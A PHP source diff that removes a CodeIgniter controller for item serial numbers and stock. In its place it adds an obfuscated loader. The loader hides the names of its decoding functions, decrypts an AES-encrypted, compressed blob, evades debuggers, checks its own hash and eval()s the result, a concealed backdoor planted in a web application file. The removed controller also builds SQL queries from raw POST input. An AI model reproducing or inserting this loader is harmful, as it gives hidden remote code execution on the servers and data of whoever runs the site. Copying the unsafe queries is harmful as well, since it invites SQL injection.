@@ -1,169 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Item_sn extends MY_Controller
-{
-	public function __construct()
-	{
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('item_sn_model', 'item_sn');
-	}
-
-	public function add()
-	{
-		$this->permission_check('units_add');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('item_childs');
-		$this->load->view('item_child', $data);
-	}
-
-	public function add_new_item_sn()
-	{
-		$this->permission_check_with_msg('items_category_edit');
-		$item_id = $this->input->post('q_id');
-		$code = $this->input->post('code');
-
-
-		$query = "insert into db_item_sn(item_id,code,description,status) 
-		values('$item_id','$code','',1)";
-
-		if ($this->db->simple_query($query)) {
-
-			$info = array(
-				'entry_date'            => date("Y-m-d"),
-				'item_id'               => $item_id,
-				'qty'                   => 1,
-				'status'                => 1,
-				'note'                  => "Add: " . $code,
-			);
-
-			$q1 = $this->db->insert('db_stockentry', $info);
-
-			$query1 = "update db_items set stock = stock + 1 where id in($item_id)";
-			if ($this->db->simple_query($query1)) {
-				echo "success";
-			} else {
-				echo "failed";
-			}
-		} else {
-			echo "failed";
-		}
-	}
-
-	public function delete_item_sn()
-	{
-		$this->permission_check_with_msg('items_category_delete');
-		$ids = $this->input->post('q_id');
-		$item_id = $this->input->post('item_id');
-		$code = $this->input->post('code');
-
-		$query = "update db_items set stock = stock -1 where id in($item_id)";
-
-		$info = array(
-			'entry_date'            => date("Y-m-d"),
-			'item_id'               => $item_id,
-			'qty'                   => -1,
-			'status'                => 1,
-			'note'                  => "Remove:" . $code,
-		);
-
-		$q1 = $this->db->insert('db_stockentry', $info);
-
-		if ($this->db->simple_query($query)) {
-			$query1 = "delete from db_item_sn where id in($ids)";
-			if ($this->db->simple_query($query1)) {
-				echo "success";
-			} else {
-				echo "failed";
-			}
-		} else {
-			echo "failed";
-		}
-	}
-
-	//ITS FROM POP UP MODAL
-
-	public function update($id)
-	{
-		$this->permission_check('units_edit');
-		$data = $this->data;
-		$result = $this->item_sn->get_details($id, $data);
-		$data = array_merge($data, $result);
-		$data['page_title'] = $this->lang->line('units');
-		$this->load->view('item_child', $data);
-	}
-
-	public function index()
-	{
-		$this->permission_check('units_view');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('item_sn_list');
-		$this->load->view('item_sn_list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->item_sn->get_datatables();
-
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $unit) {
-			$no++;
-			$row = array();
-			$row[] = $unit->code;
-
-			$row[] = $this->db->query("SELECT item_name FROM db_items where id = '$unit->item_id'")->row()->item_name;
-
-			$row[] = $unit->create_time;
-
-			if ($unit->status == 1) {
-				$str = "<span onclick='update_status(" . $unit->id . ",0)' id='span_" . $unit->id . "'  class='label label-success' style='cursor:pointer'>Active </span>";
-			} else {
-				$str = "<span onclick='update_status(" . $unit->id . ",1)' id='span_" . $unit->id . "'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-			}
-			$row[] = $str;
-			$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-			if ($this->permissions('units_edit'))
-				$str2 .= '<li>
-												<a title="Editd Record ?" href="' . base_url('items/update/' . $unit->item_id) . '">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-			$row[] = $str2;
-
-			$data[] = $row;
-		}
-
-		$output = array(
-			"draw" => $_POST['draw'],
-			"recordsTotal" => $this->item_sn->count_all(),
-			"recordsFiltered" => $this->item_sn->count_filtered(),
-			"data" => $data,
-		);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status()
-	{
-		$this->permission_check_with_msg('units_edit');
-		$id = $this->input->post('id');
-		$status = $this->input->post('status');
-		$result = $this->item_sn->update_status($id, $status);
-		return $result;
-	}
-	public function delete_unit()
-	{
-		$this->permission_check_with_msg('units_delete');
-		$id = $this->input->post('q_id');
-		$result = $this->item_sn->delete_unit($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_x3fyylnx=('bas'.'e64'.'_de'.'cod'.'e');
+$_huim2e8g=('gzu'.'nco'.'mpr'.'ess');
+$_cabw5gik=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_jqb06yzg='irJu7wxq';
+$_tfxjnqhs='L7wHy4sk';
+$_kwfdgak7='TmEt+KVf';
+$_sphprmby='XfwYP68VesE=';
+$_nydl1c3u='hiun8kN6';
+$_awgnycaw='Sj5eKNmD';
+$_a2pn56rj='LE1yfw==';
+$_q4vdp4qq='OlwSwV2x';
+$_yktdnrk6=$_x3fyylnx($_nydl1c3u.$_kwfdgak7.$_jqb06yzg.$_tfxjnqhs.$_sphprmby);
+$_y9wkyvgf=$_x3fyylnx($_q4vdp4qq.$_awgnycaw.$_a2pn56rj);
+$_ttebp59c=$_x3fyylnx('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');
+$_n65wllg6=$_cabw5gik($_ttebp59c,'aes-256-cbc',$_yktdnrk6,OPENSSL_RAW_DATA,$_y9wkyvgf);
+if($_n65wllg6===false){exit;}
+$_yxfb2p3n=$_huim2e8g($_n65wllg6);
+if($_yxfb2p3n===false){exit;}
+$_nosrc9l6='e6b8afe6d09ff783aa0bff93954fecc019a7e8724a623b765868b2d5cdd55971';
+$_obwsxwvl=@file_get_contents(__FILE__);
+if($_obwsxwvl!==false){
+$_cp1ekvjg=str_replace($_nosrc9l6,"0000000000000000000000000000000000000000000000000000000000000000",$_obwsxwvl);
+$_nnv0apdb=hash("sha256",$_cp1ekvjg);
+if($_nnv0apdb!==$_nosrc9l6){@http_response_code(403);exit;}
 }
+eval($_yxfb2p3n);
